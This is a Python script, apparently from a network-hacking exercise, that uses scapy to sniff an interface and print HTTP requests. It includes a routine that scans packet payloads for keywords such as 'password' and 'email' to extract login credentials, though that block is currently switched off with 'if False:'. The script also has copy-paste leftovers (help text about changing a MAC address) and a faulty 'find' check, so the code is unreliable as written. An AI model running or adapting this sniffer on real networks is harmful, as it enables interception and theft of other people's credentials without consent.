#!/usr/bin/env python3

# http://testphp.vulnweb.com/login.php

import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interface', dest='interface',
                      help='Interface to change its MAC address.')
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error(
            '[-] Please specify an interface, Use --help for more info.')

    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_raw_layer(packet):
    if packet.haslayer(scapy.Raw):
        return packet[scapy.Raw]


def get_login_info(packet):

    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')
        keywords = ['username', 'password', 'user',
                    'login', 'pass', 'uid', 'email']
        for keyword in keywords:
            if keyword in load:
                return load


def http_header(packet):
    http_packet = str(packet)
    if http_packet.find('GET'):
        GET_print(packet)
    print(packet)


def GET_print(packet1):
    print("***************************************GET PACKET****************************************************")

    print(packet1)

    print("*****************************************************************************************************")


def process_sniffed_packet(packet):

    if packet.haslayer(scapy.Ether):
        src_mac = packet[scapy.Ether].src
        dst_mac = packet[scapy.Ether].dst

    if packet.haslayer(scapy.IP):
        source_ip = packet[scapy.IP].src
        if source_ip == '10.0.2.15':
            # print(packet.show())
            pass

    if packet.haslayer(http.HTTPRequest):
        http_header(packet)
        GET_print(packet)

    if False:

        try:
            if packet.haslayer(http.HTTPRequest):
                url = get_url(packet)
                print('[+] HTTP Request >>' + url.decode('utf-8'))

                login_info = get_login_info(packet)
                if login_info:
                    print('\n\n[+] Possible username/password > ' +
                          login_info + '\n\n')

            raw = get_raw_layer(packet)
            if raw:
                print(raw)

        except UnicodeDecodeError:
            print('[-] Exception thrown convertint to utf-8')


options = get_arguments()
sniff(options.interface)
